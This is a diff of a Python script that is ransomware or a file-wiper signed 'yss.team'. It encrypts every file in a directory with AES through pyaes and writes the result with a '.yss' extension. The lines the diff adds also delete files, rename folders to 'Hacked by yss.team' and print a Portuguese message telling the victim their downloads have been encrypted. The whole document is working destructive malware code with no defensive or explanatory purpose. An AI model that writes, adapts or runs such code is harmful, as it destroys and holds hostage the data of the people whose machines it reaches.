@@ -2,8 +2,6 @@ import os
 import pyaes
 from random import randint
 
-
-
 #
 #
 # p = 'teste.txt.luck.luck'
@@ -33,7 +31,7 @@ chdir('..')
 for c in listdir():
     if isfile(c):
         if (c == 'painel.py'):
-            os.rename(c, 'yss.team')
+            os.rename(c, 'Hacked by yss.team')
 
         p = c
         filename = p
@@ -46,13 +44,27 @@ for c in listdir():
         aes = pyaes.AESModeOfOperationCTR(key)
         crypto_data = aes.encrypt(file_data)
 
-        nw = filename + '.luck'
+        nw = filename + '.yss'
         file = open(nw, 'w')
         file_data = file.write(str(crypto_data))
         file.close()
     else:
+
         os.rename(c, f'coded by yss.team - {randint(232323232323, 23232323232323232)}')
+        for x in listdir():
+            if isfile(x):
+                if (x == 'painel.py'):
+                    os.rename(x, 'Hacked by yss.team')
+
+                p = x
+                filename = p
+                file = open(filename, 'rb')
+                file_data = file.read()
+                file.close()
+
+                os.remove(filename)
+            else:
+                os.rename(c, f'hacked by yss and x04 /// coded by yss.team - {randint(4444444444444, 999999999999999999999999999999999999)}')
 
 
-
-print('M7 ant random 😘')
+print('M7 ant random 😘, você foi hackeado, todos os seus downloads foram encriptados')
